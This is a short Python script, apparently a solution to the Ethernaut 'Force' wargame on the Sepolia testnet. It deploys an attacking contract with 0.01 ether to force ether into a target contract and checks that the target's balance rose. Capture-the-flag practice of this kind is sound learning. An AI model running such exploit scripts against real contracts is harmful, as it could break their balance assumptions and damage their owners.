#!/usr/bin/python3
from ape import accounts, project
from rich.console import Console


# sepolia: 0xaF5c4E31dbc0F6959defB44339Fb08bF4fC957aF
ADDRESS = "0xaF5c4E31dbc0F6959defB44339Fb08bF4fC957aF"

console = Console()

def attack():
    attacker = accounts[0]
    attacker.set_autosign(True)
    target_contract = project.Force.at(ADDRESS)

    console.print(f"[green]Balance Before The Hack: [magenta]{target_contract.balance}")
    console.print("[red]Attacking Now...")

    attacking_contract = project.AttackForce.deploy(value="0.01 ether", sender=attacker)

    attacking_contract.attack(target_contract.address, sender=attacker)


    console.print(f"[green]Balance After The Hack: [magenta]{target_contract.balance}")

    assert target_contract.balance > 0



def main():
    attack()


if __name__ == "__main__":
    main()
